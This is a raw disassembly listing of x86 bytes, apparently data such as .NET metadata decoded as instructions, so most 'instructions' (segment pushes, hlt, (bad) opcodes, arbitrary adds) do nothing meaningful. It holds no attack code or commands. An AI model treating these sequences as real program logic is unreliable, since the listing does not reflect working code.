  407045:	02 01                	add    (%ecx),%al
  407047:	03 8b 1d 0e 00 01    	add    0x1000e1d(%ebx),%ecx
  40704d:	03 d1                	add    %ecx,%edx
  40704f:	0e                   	push   %cs
  407050:	47                   	inc    %edi
  407051:	02 c1                	add    %cl,%al
  407053:	01 14 1d 47 02 c1 01 	add    %edx,0x1c10247(,%ebx,1)
  40705a:	00 20                	add    %ah,(%eax)
  40705c:	42                   	inc    %edx
  40705d:	02 09                	add    (%ecx),%cl
  40705f:	03 8b 1d 6b 01 09    	add    0x9016b1d(%ebx),%ecx
  407065:	03 72 21             	add    0x21(%edx),%esi
  407068:	6a 05                	push   $0x5
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	73 1d                	jae    0x40708b
  40706e:	70 05                	jo     0x407075
  407070:	19 03                	sbb    %eax,(%ebx)
  407072:	96                   	xchg   %eax,%esi
  407073:	22 76 05             	and    0x5(%esi),%dh
  407076:	21 03                	and    %eax,(%ebx)
  407078:	8c 17                	mov    %ss,(%edi)
  40707a:	7c 05                	jl     0x407081
  40707c:	c1 01 f1             	roll   $0xf1,(%ecx)
  40707f:	21 47 02             	and    %eax,0x2(%edi)
  407082:	19 03                	sbb    %eax,(%ebx)
  407084:	89 23                	mov    %esp,(%ebx)
  407086:	bf 01 81 02 bb       	mov    $0xbb028101,%edi
  40708b:	0d 86 05 29 03       	or     $0x3290586,%eax
  407090:	49                   	dec    %ecx
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	e5 22                	in     $0x22,%eax
  407098:	7b 00                	jnp    0x40709a
  40709a:	59                   	pop    %ecx
  40709b:	01 ed                	add    %ebp,%ebp
  40709d:	0e                   	push   %cs
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	c1 0e c3             	rorl   $0xc3,(%esi)
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	bc 18 93 05 c1       	mov    $0xc1059318,%esp
  4070ad:	01 16                	add    %edx,(%esi)
  4070af:	21 99 05 49 03 8b    	and    %ebx,-0x74fcb6fb(%ecx)
  4070b5:	1d 0e 00 61 01       	sbb    $0x161000e,%eax
  4070ba:	95                   	xchg   %eax,%ebp
  4070bb:	03 cd                	add    %ebp,%ecx
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	76 14                	jbe    0x4070d6
  4070c2:	75 01                	jne    0x4070c5
  4070c4:	69 00 8b 1d 0e 00    	imul   $0xe1d8b,(%eax),%eax
  4070ca:	21 02                	and    %eax,(%edx)
  4070cc:	ac                   	lods   %ds:(%esi),%al
  4070cd:	13 70 01             	adc    0x1(%eax),%esi
  4070d0:	69 00 a6 0c aa 05    	imul   $0x5aa0ca6,(%eax),%eax
  4070d6:	c1 01 d9             	roll   $0xd9,(%ecx)
  4070d9:	13 b0 05 c1 01 d5    	adc    -0x2afe3efb(%eax),%esi
  4070df:	1c 47                	sbb    $0x47,%al
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 e3                	add    %esp,%ebx
  4070e5:	0c bd                	or     $0xbd,%al
  4070e7:	05 59 01 95 17       	add    $0x17950159,%eax
  4070ec:	1d 00 61 03 ac       	sbb    $0xac036100,%eax
  4070f1:	13 47 02             	adc    0x2(%edi),%eax
  4070f4:	69 03 93 14 c3 00    	imul   $0xc31493,(%ebx),%eax
  4070fa:	b1 02                	mov    $0x2,%cl
  4070fc:	11 0f                	adc    %ecx,(%edi)
  4070fe:	c3                   	ret
  4070ff:	05 59 03 23 0f       	add    $0xf230359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 ac 13       	add    $0x13ac0359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	a2 22 c9 05 79       	mov    %al,0x7905c922
  407113:	03 8b 1d cf 05 79    	add    0x7905cf1d(%ebx),%ecx
  407119:	03 26                	add    (%esi),%esp
  40711b:	0e                   	push   %cs
  40711c:	d6                   	salc
  40711d:	05 c1 00 a6 0f       	add    $0xfa600c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 a6 0f 0e 00 09    	add    %ah,0x9000e0f(%esi)
  40712b:	03 8b 1d 36 02 0c    	add    0xc02361d(%ebx),%ecx
  407131:	00 8b 1d 0e 00 0c    	add    %cl,0xc000e1d(%ebx)
  407137:	00 22                	add    %ah,(%edx)
  407139:	0b f5                	or     %ebp,%esi
  40713b:	05 0c 00 db 22       	add    $0x22db000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	67 25 fb 05 c1 01    	addr16 and $0x1c105fb,%eax
  40714a:	9b                   	fwait
  40714b:	18 01                	sbb    %al,(%ecx)
  40714d:	06                   	push   %es
  40714e:	51                   	push   %ecx
  40714f:	00 3d 20 11 06 51    	add    %bh,0x51061120
  407155:	00 cc                	add    %cl,%ah
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 7b 0b             	add    %bh,0xb(%ebx)
  40715e:	17                   	pop    %ss
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	3c 26                	cmp    $0x26,%al
  407164:	1d 06 69 00 8b       	sbb    $0x8b006906,%eax
  407169:	1d 01 03 61 00       	sbb    $0x610301,%eax
  40716e:	8b 1d 2d 06 91 03    	mov    0x391062d,%ebx
  407174:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407175:	0f 0e                	femms
  407177:	00 99 03 8b 1d 56    	add    %bl,0x561d8b03(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 2d 13 35 06 81    	add    0x81063513,%ebp
  407185:	02 25 0d 0a 00 91    	add    0x91000a0d,%ah
  40718b:	02 8b 25 35 05 91    	add    -0x6efacadb(%ebx),%cl
  407191:	02 dc                	add    %ah,%bl
  407193:	11 43 06             	adc    %eax,0x6(%ebx)
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	7c 0d                	jl     0x4071a7
  40719a:	47                   	inc    %edi
  40719b:	02 91 02 8b 25 54    	add    0x54258b02(%ecx),%dl
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 d3                	add    %bl,%dl
  4071a5:	11 7c 05 91          	adc    %edi,-0x6f(%ebp,%eax,1)
  4071a9:	02 c7                	add    %bh,%al
  4071ab:	11 6b 01             	adc    %ebp,0x1(%ebx)
  4071ae:	91                   	xchg   %eax,%ecx
  4071af:	02 98 25 5e 06 91    	add    -0x6ef9a1db(%eax),%bl
  4071b5:	02 6b 0d             	add    0xd(%ebx),%ch
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 22                	add    %ah,(%edx)
  4071bd:	0b f5                	or     %ebp,%esi
  4071bf:	05 b9 03 58 23       	add    $0x235803b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	73 1d                	jae    0x4071e7
  4071ca:	92                   	xchg   %eax,%edx
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	96                   	xchg   %eax,%esi
  4071cf:	22 a4 06 1c 00 01 12 	and    0x1201001c(%esi,%eax,1),%ah
  4071d6:	a9 06 24 00 89       	test   $0x89002406,%eax
  4071db:	23 bf 01 c9 03 89    	and    -0x76fc36ff(%edi),%edi
  4071e1:	18 b3 06 c9 03 0e    	sbb    %dh,0xe03c906(%ebx)
  4071e7:	0b b9 06 d1 03 7d    	or     0x7d03d106(%ecx),%edi
  4071ed:	0f c1 06             	xadd   %eax,(%esi)
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	eb 0c                	jmp    0x407200
  4071f4:	c8 06 d9 03          	enter  $0xd906,$0x3
  4071f8:	fb                   	sti
  4071f9:	0d cf 06 f1 03       	or     $0x3f106cf,%eax
  4071fe:	e2 0f                	loop   0x40720f
  407200:	d8 06                	fadds  (%esi)
  407202:	01 04 d6             	add    %eax,(%esi,%edx,8)
  407205:	1b e2                	sbb    %edx,%esp
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	e2 0f                	loop   0x40721b
  40720c:	17                   	pop    %ss
  40720d:	07                   	pop    %es
  40720e:	2c 00                	sub    $0x0,%al
  407210:	81 21 23 07 34 00    	andl   $0x340723,(%ecx)
  407216:	93                   	xchg   %eax,%ebx
  407217:	0d 3b 07 1c 00       	or     $0x1c073b,%eax
  40721c:	8b 1d 0e 00 c1 01    	mov    0x1c1000e,%ebx
  407222:	7a 26                	jp     0x40724a
  407224:	84 00                	test   %al,(%eax)
  407226:	21 04 8b             	and    %eax,(%ebx,%ecx,4)
  407229:	1d 6b 01 19 04       	sbb    $0x419016b,%eax
  40722e:	8b 1d 59 07 29 04    	mov    0x4290759,%ebx
  407234:	4b                   	dec    %ebx
  407235:	1f                   	pop    %ds
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 8e 13 93 01 49    	add    %ecx,0x49019313(%esi)
  40723f:	04 8b                	add    $0x8b,%al
  407241:	1d 6b 01 59 02       	sbb    $0x259016b,%eax
  407246:	8b 1d 0e 00 31 04    	mov    0x431000e,%ebx
  40724c:	8b 1d 0e 00 51 04    	mov    0x451000e,%ebx
  407252:	6b 12 01             	imul   $0x1,(%edx),%edx
  407255:	03 51 04             	add    0x4(%ecx),%edx
  407258:	08 12                	or     %dl,(%edx)
  40725a:	01 03                	add    %eax,(%ebx)
  40725c:	51                   	push   %ecx
  40725d:	04 07                	add    $0x7,%al
  40725f:	0d 7a 07 51 04       	or     $0x451077a,%eax
  407264:	21 13                	and    %edx,(%ebx)
  407266:	81 07 51 04 83 25    	addl   $0x25830451,(%edi)
  40726c:	2b 02                	sub    (%edx),%eax
  40726e:	51                   	push   %ecx
  40726f:	04 d9                	add    $0xd9,%al
  407271:	07                   	pop    %es
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	b0 1d                	mov    $0x1d,%al
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 8b             	cmp    %eax,(%ebx,%ecx,4)
  40727d:	1d 8e 07 51 04       	sbb    $0x451078e,%eax
  407282:	cb                   	lret
  407283:	07                   	pop    %es
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 27             	cmp    %eax,(%edi,%eiz,1)
  407289:	16                   	push   %ss
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	8b 1d 2b 02 59 02    	mov    0x259022b,%ebx
  407294:	67 25 31 02 51 03    	addr16 and $0x3510231,%eax
  40729a:	76 14                	jbe    0x4072b0
  40729c:	9a 07 79 04 8b 1d 6b 	lcall  $0x6b1d,$0x8b047907
  4072a3:	01 51 04             	add    %edx,0x4(%ecx)
  4072a6:	d2 07                	rolb   %cl,(%edi)
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 a0                	add    $0xa0,%al
  4072ad:	1d 88 07 c1 00       	sbb    $0xc10788,%eax
  4072b2:	b2 14                	mov    $0x14,%dl
  4072b4:	23 02                	and    (%edx),%eax
  4072b6:	81 04 0c 26 be 07 91 	addl   $0x9107be26,(%esp,%ecx,1)
  4072bd:	04 57                	add    $0x57,%al
  4072bf:	25 d0 07 a1 04       	and    $0x4a107d0,%eax
  4072c4:	8b 1d 0e 00 c1 01    	mov    0x1c1000e,%ebx
  4072ca:	22 21                	and    (%ecx),%ah
  4072cc:	f9                   	stc
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 4b 1f             	add    0x1f(%ebx),%cl
  4072d2:	99                   	cltd
  4072d3:	01 49 02             	add    %ecx,0x2(%ecx)
  4072d6:	4b                   	dec    %ebx
  4072d7:	1f                   	pop    %ds
  4072d8:	ab                   	stos   %eax,%es:(%edi)
  4072d9:	01 a9 00 8b 1d 0e    	add    %ebp,0xe1d8b00(%ecx)
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	8c 17                	mov    %ss,(%edi)
  4072e4:	06                   	push   %es
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	db 22                	(bad) (%edx)
  4072ea:	f4                   	hlt
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	be 1b 0e 00 c1       	mov    $0xc1000e1b,%esi
  4072f3:	01 c5                	add    %eax,%ebp
  4072f5:	1f                   	pop    %ds
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 bd 11 28 08 49    	add    %bh,0x49082811(%ebp)
  4072ff:	02 4b 1f             	add    0x1f(%ebx),%cl
  407302:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	62 00                	bound  %eax,(%eax)
  407308:	32 08                	xor    (%eax),%cl
  40730a:	c1 01 e5             	roll   $0xe5,(%ecx)
  40730d:	17                   	pop    %ss
  40730e:	47                   	inc    %edi
  40730f:	02 a9 04 c1 0f 37    	add    0x370fc104(%ecx),%ch
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	62 00                	bound  %eax,(%eax)
  40731a:	3c 08                	cmp    $0x8,%al
  40731c:	51                   	push   %ecx
  40731d:	01 62 00             	add    %esp,0x0(%edx)
  407320:	41                   	inc    %ecx
  407321:	08 51 01             	or     %dl,0x1(%ecx)
  407324:	62 00                	bound  %eax,(%eax)
  407326:	46                   	inc    %esi
  407327:	08 51 01             	or     %dl,0x1(%ecx)
  40732a:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	c1 0f 52             	rorl   $0x52,(%edi)
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	6b 00 57             	imul   $0x57,(%eax),%eax
  407339:	08 51 01             	or     %dl,0x1(%ecx)
  40733c:	6b 00 5c             	imul   $0x5c,(%eax),%eax
  40733f:	08 51 01             	or     %dl,0x1(%ecx)
  407342:	6b 00 61             	imul   $0x61,(%eax),%eax
  407345:	08 51 01             	or     %dl,0x1(%ecx)
  407348:	b2 0d                	mov    $0xd,%dl
  40734a:	68 08 b1 04 c1       	push   $0xc104b108
  40734f:	0f 6d                	(bad)
  407351:	08 49 02             	or     %cl,0x2(%ecx)
  407354:	4b                   	dec    %ebx
  407355:	1f                   	pop    %ds
  407356:	7a 08                	jp     0x407360
  407358:	59                   	pop    %ecx
  407359:	03 16                	add    (%esi),%edx
  40735b:	26 23 02             	and    %es:(%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	8b 1d 88 08 c1 00    	mov    0xc10888,%ebx
  407366:	b4 11                	mov    $0x11,%ah
  407368:	f4                   	hlt
  407369:	01 89 01 8b 1d 6b    	add    %ecx,0x6b1d8b01(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	73 00                	jae    0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 18                	add    (%eax),%bl
  407379:	0e                   	push   %cs
  40737a:	bd 08 49 02 b2       	mov    $0xb2024908,%ebp
  40737f:	0d c4 08 49 02       	or     $0x24908c4,%eax
  407384:	40                   	inc    %eax
  407385:	00 cb                	add    %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	62 00                	bound  %eax,(%eax)
  40738c:	d2 08                	rorb   %cl,(%eax)
  40738e:	49                   	dec    %ecx
  40738f:	02 7c 00 d9          	add    -0x27(%eax,%eax,1),%bh
  407393:	08 49 02             	or     %cl,0x2(%ecx)
  407396:	6b 00 e0             	imul   $0xffffffe0,(%eax),%eax
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	4b                   	dec    %ebx
  40739d:	1f                   	pop    %ds
  40739e:	12 09                	adc    (%ecx),%cl
  4073a0:	d1 04 8b             	roll   $1,(%ebx,%ecx,4)
  4073a3:	1d 28 09 09 00       	sbb    $0x90928,%eax
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 e4                	add    %ah,%ah
  4075bd:	1a 9f 00 00 00 f1    	sbb    -0xf000000(%edi),%bl
  4075c3:	23 a4 00 00 00 09 24 	and    0x24090000(%eax,%eax,1),%esp
  4075ca:	a9 00 00 00 1e       	test   $0x1e000000,%eax
  4075cf:	08 ae 00 00 00 dd    	or     %ch,-0x23000000(%esi)
  4075d5:	0a ae 00 00 00 ca    	or     -0x36000000(%esi),%ch
  4075db:	0c b2                	or     $0xb2,%al
  4075dd:	00 00                	add    %al,(%eax)
  4075df:	00 f2                	add    %dh,%dl
  4075e1:	06                   	push   %es
  4075e2:	b7 00                	mov    $0x0,%bh
  4075e4:	00 00                	add    %al,(%eax)
  4075e6:	98                   	cwtl
  4075e7:	0a bb 00 00 00 54    	or     0x54000000(%ebx),%bh
  4075ed:	1f                   	pop    %ds
  4075ee:	b2 00                	mov    $0x0,%dl
  4075f0:	00 00                	add    %al,(%eax)
  4075f2:	94                   	xchg   %eax,%esp
  4075f3:	1b bf 00 00 00 81    	sbb    -0x7f000000(%edi),%edi
  4075f9:	09 b7 00 00 00 52    	or     %esi,0x52000000(%edi)
  4075ff:	05 c3 01 00 00       	add    $0x1c3,%eax
  407604:	8a 1a                	mov    (%edx),%bl
  407606:	f8                   	clc
  407607:	01 00                	add    %eax,(%eax)
  407609:	00 3f                	add    %bh,(%edi)
  40760b:	03 fe                	add    %esi,%edi
  40760d:	01 00                	add    %eax,(%eax)
  40760f:	00 a9 02 69 02 00    	add    %ch,0x26902(%ecx)
  407615:	00 a5 26 6d 02 00    	add    %ah,0x26d26(%ebp)
  40761b:	00 26                	add    %ah,(%esi)
  40761d:	0b 71 02             	or     0x2(%ecx),%esi
  407620:	00 00                	add    %al,(%eax)
  407622:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407623:	0a 75 02             	or     0x2(%ebp),%dh
  407626:	00 00                	add    %al,(%eax)
  407628:	61                   	popa
  407629:	1b 7a 02             	sbb    0x2(%edx),%edi
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
